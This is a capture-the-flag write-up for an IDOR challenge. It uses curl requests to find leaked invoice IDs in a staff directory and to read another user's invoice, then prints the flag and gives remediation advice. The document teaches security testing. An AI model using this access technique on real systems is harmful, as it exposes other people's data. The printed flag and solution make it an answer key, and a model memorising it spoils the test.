## Description

> Your account can read your receipt. The public staff directory includes references to other receipts. Is knowing an identifier the same as being authorized?

The hint points directly to an **IDOR (Insecure Direct Object Reference)** vulnerability. The important question is whether the server checks ownership of each requested invoice. The staff directory supplies valid identifiers for testing that boundary.

---

## Reconnaissance

Start by visiting the challenge URL. The landing page shows:

- `My invoice` → `invoice?id=1001`
- `Public staff directory` → `directory`

Let's fetch both pages.

```bash
# Fetch your own invoice
curl -sS -L -c cookies.txt -b cookies.txt 'https://challenges.tibeb.org/02ac1881-9114-48ca-afcb-f195c911e97a/invoice?id=1001'
```

Response:
```json
{"id": "1001", "note": "Visitor lunch, paid."}
```

Now fetch the public staff directory:

```bash
curl -sS -L -c cookies.txt -b cookies.txt 'https://challenges.tibeb.org/02ac1881-9114-48ca-afcb-f195c911e97a/directory'
```

Response:
```json
{"staff": [{"name": "Archivist", "invoice_reference": 4242}, {"name": "Steward", "invoice_reference": 1730}]}
```

The directory leaks two other invoice IDs: **4242** and **1730**.

---

## Exploitation (IDOR)

The application does not check if the logged-in visitor is allowed to view these invoices. We can simply change the `id` parameter to one of the leaked references.

Request the Archivist's invoice:

```bash
curl -sS -i -L -c cookies.txt -b cookies.txt 'https://challenges.tibeb.org/02ac1881-9114-48ca-afcb-f195c911e97a/invoice?id=4242'
```

Response body:

```json
{"id": "4242", "note": "tibeb{receipt_0d7855f93eb403516e91}"}
```

The flag is right there.

---

## Flag

```
tibeb{receipt_0d7855f93eb403516e91}
```

---

## Vulnerability Explanation

The application exposes invoice objects through an `id` parameter without enforcing ownership in the recorded challenge. IDOR does not require sequential identifiers: a valid leaked reference is enough when object-level authorization is missing. By simply changing the `id` to a value obtained from the public staff directory, any visitor can read other users' receipts. This is a classic **IDOR** vulnerability.

---

## Remediation

- Implement proper access control: verify that the currently authenticated user is the owner of the requested invoice before returning its data.
- Avoid exposing internal identifiers in public directories.
- Use indirect references (e.g., random UUIDs) instead of sequential integers, though this alone is not a substitute for authorization checks.

---

## Conclusion

A simple but effective challenge demonstrating the importance of authorization checks. Always test whether changing an object identifier grants access to data belonging to other users.
